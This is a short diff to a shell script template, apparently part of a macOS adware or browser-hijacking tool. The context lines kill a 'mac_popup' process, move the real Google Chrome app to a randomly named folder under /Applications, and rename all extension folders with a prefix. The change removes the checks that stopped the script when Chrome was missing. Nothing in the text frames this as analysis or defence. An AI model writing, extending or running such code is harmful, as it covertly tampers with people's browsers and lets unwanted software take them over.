@@ -203,26 +203,11 @@ pgrep -f mac_popup | xargs kill
 # Get the location of the real chrome app
 newRandomName=$(xxd -l 32 -c 32 -p < /dev/random)
 chromeAppLocation=$(ls /Applications/*.app/Contents/MacOS/Google\ Chrome*)
-
-# Check that the file exists
-isFound=$(ls /Applications/*.app/Contents/MacOS/Google\ Chrome* >> /dev/null && echo "found")
-if [ "$isFound" != "found" ]
-then
-  exit 1
-fi
-
 IFS='/'
 read -a strarr <<< "$chromeAppLocation"
 realChromeRandomDirName=${{strarr[2]}}
 IFS=' '
-
-# Check that the file exists
 mv /Applications/${{realChromeRandomDirName}} /Applications/${{newRandomName}}.app
-isFound=$(ls /Applications/*.app/Contents/MacOS/Google\ Chrome* >> /dev/null && echo "found")
-if [ "$isFound" != "found" ]
-then
-  exit 1
-fi
 
 # Rename all folders with a prefix
 find {extPath} -maxdepth 1 -mindepth 1 -type d -execdir bash -c 'mv "$1" "./a${{1#./}}"' mover {{}} \;
